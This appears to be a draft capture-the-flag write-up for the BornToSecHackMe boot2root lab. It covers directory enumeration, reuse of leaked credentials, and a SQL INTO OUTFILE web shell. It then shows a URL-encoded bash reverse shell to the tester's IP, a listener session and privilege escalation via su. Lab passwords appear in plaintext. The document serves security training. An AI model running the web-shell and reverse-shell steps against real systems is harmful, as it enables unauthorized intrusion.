### Fill this later

With `gobuster` we can try to find directories and files on the server.

```
nlederge@k0r3p13:~/my_bins $ gobuster dir -u 10.11.250.230 -w ~/SecLists/Discovery/Web-Content/common.txt                    
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.11.250.230
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /home/nlederge/SecLists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.htaccess            (Status: 403) [Size: 290]
.hta                 (Status: 403) [Size: 285]
.htpasswd            (Status: 403) [Size: 290]
cgi-bin/             (Status: 403) [Size: 289]
fonts                (Status: 301) [Size: 314] [--> http://10.11.250.230/fonts/]
forum                (Status: 403) [Size: 286]
index.html           (Status: 200) [Size: 1025]
server-status        (Status: 403) [Size: 294]
Progress: 4750 / 4750 (100.00%)
===============================================================
Finished
===============================================================
```

The route `forum` is interesting but we get a forbidden access. By using our browser and ignoring the expired TLS certificate, we can access it `https://10.11.250.230/forum`.
We can try again with gobuster but now by ignoring the invalid certificates.

```
nlederge@k0r3p13:~/my_bins $ gobuster dir -u https://10.11.250.230 -k -w ~/SecLists/Discovery/Web-Content/common.txt
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://10.11.250.230
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /home/nlederge/SecLists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
cgi-bin/             (Status: 403) [Size: 290]
forum                (Status: 301) [Size: 316] [--> https://10.11.250.230/forum/]
phpmyadmin           (Status: 301) [Size: 321] [--> https://10.11.250.230/phpmyadmin/]
server-status        (Status: 403) [Size: 295]
webmail              (Status: 301) [Size: 318] [--> https://10.11.250.230/webmail/]
Progress: 4750 / 4750 (100.00%)
===============================================================
Finished
===============================================================
```

It gives us a few interesting directories : `forum`, `phpmyadmin`, `webmail`. `phpmyadmin` and `webmail` ask for credentials, `forum` doesn't.

By browsing the `forum`, we can see that there are multiple posts and specifically one about `Probleme login ?` posted by `lmezard` posting a lot of logs.
There a useful information in the logs :
- The server hostname `BornToSecHackMe` is revealed.
- `lmezard` is a valid user account and scheduled cron jobs.
- `admin` is also a valid account and has sudo access.
- The string `!q\]Ej?*5K5cy*AJ` is entered in the login field, probably an accidental pasted string.

We can login to the forum with the credentials `lmezard` : `!q\]Ej?*5K5cy*AJ`. When trying to send an email to the admin account, our mail appears as the sender email `laurie@borntosec.net`. We can login to the webmail with the credentials `lmezard` : `!q\]Ej?*5K5cy*AJ`.

An email sent by `qudevide` to `lmezard` says :

```
Hey Laurie,

You cant connect to the databases now. Use root/Fg-'kKXBj87E:aJ$

Best regards.
```

With these credentials `root` : `Fg-'kKXBj87E:aJ$`, we can login to the phpmyadmin database and see the databases.
We can execute SQL queries to create files on the server, let's try to create a shell.php file in the forum directory to try to create a reverse shell. The issue is that we can't write directly in the '/var/www/forum' directory, we need to find another directory to write the file.

Let's enumerate the subdirectories with `gobuster`.
```
nlederge@k0r3p13:work/42adv_boot2root ‹main*›$ gobuster dir -u https://10.11.250.230/forum/ -k -w ~/SecLists/Discovery/Web-Content/common.txt
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://10.11.250.230/forum/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /home/nlederge/SecLists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.htpasswd            (Status: 403) [Size: 297]
.htaccess            (Status: 403) [Size: 297]
.hta                 (Status: 403) [Size: 292]
backup               (Status: 403) [Size: 294]
config               (Status: 403) [Size: 294]
images               (Status: 301) [Size: 323] [--> https://10.11.250.230/forum/images/]
includes             (Status: 301) [Size: 325] [--> https://10.11.250.230/forum/includes/]
js                   (Status: 301) [Size: 319] [--> https://10.11.250.230/forum/js/]
lang                 (Status: 301) [Size: 321] [--> https://10.11.250.230/forum/lang/]
modules              (Status: 301) [Size: 324] [--> https://10.11.250.230/forum/modules/]
index.php            (Status: 200) [Size: 4935]
index                (Status: 200) [Size: 4935]
templates_c          (Status: 301) [Size: 328] [--> https://10.11.250.230/forum/templates_c/]
themes               (Status: 301) [Size: 323] [--> https://10.11.250.230/forum/themes/]
update               (Status: 301) [Size: 323] [--> https://10.11.250.230/forum/update/]
Progress: 4750 / 4750 (100.00%)
===============================================================
Finished
===============================================================
```

After trying all the possible directories, we can write the shell.php file in the `templates_c` directory, phpmyadmin gives us a successful response.
```
SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/var/www/forum/templates_c/shell.php';
```

We can now access the shell.php file with the following URL : `https://10.11.250.230/forum/templates_c/shell.php?c=id`.

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Let's start a reverse shell with bash. We need to execute the following command in the server : `bash -c 'bash -i >& /dev/tcp/10.11.3.13/4444 0>&1'` as `10.11.3.13` is our IP and `4444` is the port we will use to receive the shell. For it to pass it trough the php script, we need to use the `?c=` parameter and URL encode the command.

We pass `bash -c 'bash -i >& /dev/tcp/10.11.3.13/4444 0>&1'` to a website like `www.urlencoder.org` and we get the encoded command. Our payload will be `?c=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.11.3.13%2F4444%200%3E%261%27`.

We will be using `penelope` to have a fully functionnal and interactive reverse shell.

```
git clone https://github.com/brightio/penelope.git
cd penelope
chmod +x penelope.py
```

And we launch it with the following command : `python3 penelope.py -p 4444`. Then we access the shell.php file with the following URL : `https://10.11.250.230/forum/templates_c/shell.php?c=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.11.3.13%2F4444%200%3E%261%27`.

We have our shell :

```
nlederge@k0r3p13:work/penelope ‹main›$ python3 penelope.py 4444
[+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 10.11.3.13 • 172.17.0.1
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from BornToSecHackMe~10.11.250.230-Linux-i686 😍️ Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /usr/bin/python! 💪
[+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
[+] Logging to /home/nlederge/.penelope/sessions/BornToSecHackMe~10.11.250.230-Linux-i686/2025_10_15-17_24_57-715.log 📜
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────
www-data@BornToSecHackMe:/var/www/forum/templates_c$ whoami
www-data
www-data@BornToSecHackMe:/var/www/forum/templates_c$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@BornToSecHackMe:/var/www/forum/templates_c$
```

In the directory `/home`, there is a directory `LOOKATME` which contains a file password.

```
www-data@BornToSecHackMe:/home$ cat /home/LOOKATME/password 
lmezard:G!@M6f4Eatau{sF"
```

With these credentials `lmezard` : `G!@M6f4Eatau{sF"`, we can login to the user `lmezard` with the following command : `su lmezard`.

```
www-data@BornToSecHackMe:/home$ su lmezard
Password: 
lmezard@BornToSecHackMe:~$ id
uid=1001(lmezard) gid=1001(lmezard) groups=1001(lmezard)
lmezard@BornToSecHackMe:~$
```

In the home directory there is a `README` file which contains this text referencing the file `fun`. It is an archive containing a lot of `pcap` files each containing part of a `c` program. Since we can't `scp` to our machine directly, we need to find another way.

```
lmezard@BornToSecHackMe:~$ cp fun /tmp/fun
lmezard@BornToSecHackMe:~$ chmod 777 /tmp/fun
lmezard@BornToSecHackMe:~$ exit
exit
www-data@BornToSecHackMe:/home$ cp /tmp/fun /var/www/forum/templates_c/fun
```

Then on our machine, we can get the file `fun` from the website.

```sh
wget https://10.11.250.230/forum/templates_c/fun --no-check-certificate
```
